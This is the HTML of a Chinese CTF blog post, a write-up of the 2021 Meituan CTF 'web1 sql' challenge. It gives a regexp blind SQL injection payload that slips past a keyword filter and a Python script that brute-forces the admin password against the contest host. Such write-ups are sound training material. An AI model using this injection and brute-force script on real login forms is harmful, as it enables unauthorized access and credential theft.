@@ -1,0 +1,166 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>美团CTF 2021 web writeup | Mengd@</title><meta name="keywords" content="-CTF"><meta name="author" content="Mengd@"><meta name="copyright" content="Mengd@"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="web1 sql  登录页面，首先fuzz测试一下过滤关键字。   过滤了select ascii substr if 各种比较，引号。而开放了regexp，&#x2F;**&#x2F;等特殊字段。不考虑bool盲注，时间盲注。考虑 regexp正则盲注，关于正则盲注可以去我的sql总结中看。 思路：正则盲注，使用16进制编码绕过引号限制，使用&#x2F;**&#x2F;绕过空格限制。使用||绕过OR限制，而\用来转义引号从而使其闭合。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="美团CTF 2021 web writeup">
+<meta property="og:url" content="http://example.com/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/index.html">
+<meta property="og:site_name" content="Mengd@">
+<meta property="og:description" content="web1 sql  登录页面，首先fuzz测试一下过滤关键字。   过滤了select ascii substr if 各种比较，引号。而开放了regexp，&#x2F;**&#x2F;等特殊字段。不考虑bool盲注，时间盲注。考虑 regexp正则盲注，关于正则盲注可以去我的sql总结中看。 思路：正则盲注，使用16进制编码绕过引号限制，使用&#x2F;**&#x2F;绕过空格限制。使用||绕过OR限制，而\用来转义引号从而使其闭合。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-05-23T05:55:44.000Z">
+<meta property="article:modified_time" content="2021-05-23T06:44:27.654Z">
+<meta property="article:author" content="Mengd@">
+<meta property="article:tag" content="-CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="https://s3.ax1x.com/2021/01/15/s0eSiT.png"><link rel="canonical" href="http://example.com/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: {"text":"Mengd@,Flag,CTF,Web,Misc,Pwn,N0p3,Nysec","fontSize":"15px"},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-23 14:44:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Mengd@" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://s3.ax1x.com/2021/01/15/s010Z4.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mengd@</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">美团CTF 2021 web writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-23T05:55:44.000Z" title="发表于 2021-05-23 13:55:44">2021-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-23T06:44:27.654Z" title="更新于 2021-05-23 14:44:27">2021-05-23</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web1-sql"><a href="#web1-sql" class="headerlink" title="web1 sql"></a>web1 sql</h1><img src="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/image-20210523140458925.png" class title="image-20210523140458925">
+
+<p>登录页面，首先fuzz测试一下过滤关键字。</p>
+<img src="/2021/05/23/%EF%BF%BD%EF%BF%BDCTF-2021-web-writeup/S_86%25%5D%5D_@2HOM8H%7DYNO%7DLT1.png" class title="img">
+
+<p>过滤了select ascii substr if 各种比较，引号。而开放了regexp，/**/等特殊字段。不考虑bool盲注，时间盲注。考虑</p>
+<p>regexp正则盲注，关于正则盲注可以去我的sql总结中看。</p>
+<p>思路：正则盲注，使用16进制编码绕过引号限制，使用/**/绕过空格限制。使用||绕过OR限制，而\用来转义引号从而使其闭合。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin\&amp;password&#x3D;||password&#x2F;**&#x2F;regexp&#x2F;**&#x2F;0x5e542a#</span><br></pre></td></tr></table></figure>
+
+<p>脚本Python3：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;eci-2ze10cbxg19yyr2ee727.cloudeci1.ichunqiu.com&#x2F;&quot;</span><br><span class="line">ALLSTR &#x3D; string.ascii_lowercase+string.ascii_uppercase+string.digits+&quot;_&quot;</span><br><span class="line">password &#x3D; &#39;&#39;</span><br><span class="line">hexs &#x3D; &#39;&#39;</span><br><span class="line">for a in range(0,50):</span><br><span class="line">    for i in ALLSTR:</span><br><span class="line">        data &#x3D; &#123;&#39;username&#39;: &quot;admin\\&quot;, &#39;password&#39;: &#39;||password&#x2F;**&#x2F;regexp&#x2F;**&#x2F;BINARY&#x2F;**&#x2F;0x5E&#39; +hexs+hex(ord(i))[2:4] + &quot;#&quot;&#125;</span><br><span class="line">        result &#x3D; requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">        # print(data)</span><br><span class="line">        if &quot;flag&quot; in result.text:</span><br><span class="line">            password &#x3D; password + i</span><br><span class="line">            hexs &#x3D; hexs+hex(ord(i))[2:4]</span><br><span class="line">            print(&quot;password is &quot; + password)</span><br><span class="line">            print(hexs)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>result：</p>
+<img src="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/image-20210523144241415.png" class title="image-20210523144241415">
+
+<p>用户名admin，密码This_1s_thE_Passw0rd登录getflag</p>
+<img src="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/image-20210523144419673.png" class title="image-20210523144419673"></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Mengd@</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/">http://example.com/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mengd@</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">-CTF</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"><img class="next-cover" src="https://z3.ax1x.com/2021/05/22/gqkm3F.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见SQL注入总结,原理分析</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://s3.ax1x.com/2021/01/15/s010Z4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Mengd@</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Kumengda"><i class="fab fa-github"></i><span>访问我的github</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is Mengd@ Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web1-sql"><span class="toc-number">1.</span> <span class="toc-text">web1 sql</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/" title="美团CTF 2021 web writeup"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="美团CTF 2021 web writeup"/></a><div class="content"><a class="title" href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/" title="美团CTF 2021 web writeup">美团CTF 2021 web writeup</a><time datetime="2021-05-23T05:55:44.000Z" title="发表于 2021-05-23 13:55:44">2021-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" title="常见SQL注入总结,原理分析"><img src="https://z3.ax1x.com/2021/05/22/gqkm3F.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见SQL注入总结,原理分析"/></a><div class="content"><a class="title" href="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" title="常见SQL注入总结,原理分析">常见SQL注入总结,原理分析</a><time datetime="2021-05-19T03:27:08.000Z" title="发表于 2021-05-19 11:27:08">2021-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/" title="记一次一血，CBC字节翻转攻击/bmp隐写"><img src="https://z3.ax1x.com/2021/05/19/g4UEgP.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次一血，CBC字节翻转攻击/bmp隐写"/></a><div class="content"><a class="title" href="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/" title="记一次一血，CBC字节翻转攻击/bmp隐写">记一次一血，CBC字节翻转攻击/bmp隐写</a><time datetime="2021-05-19T02:30:23.000Z" title="发表于 2021-05-19 10:30:23">2021-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/13/SSRF-gopher%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0/" title="SSRF gopher协议构造"><img src="https://z3.ax1x.com/2021/05/19/g4UCAH.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF gopher协议构造"/></a><div class="content"><a class="title" href="/2021/05/13/SSRF-gopher%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0/" title="SSRF gopher协议构造">SSRF gopher协议构造</a><time datetime="2021-05-13T09:43:01.000Z" title="发表于 2021-05-13 17:43:01">2021-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="ThinkPhp5.0.x反序列化链分析"><img src="https://s3.ax1x.com/2021/01/25/sL7oGj.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ThinkPhp5.0.x反序列化链分析"/></a><div class="content"><a class="title" href="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="ThinkPhp5.0.x反序列化链分析">ThinkPhp5.0.x反序列化链分析</a><time datetime="2021-04-27T09:41:59.000Z" title="发表于 2021-04-27 17:41:59">2021-04-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Mengd@</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" async="async" mobile="false"></script></div></body></html>
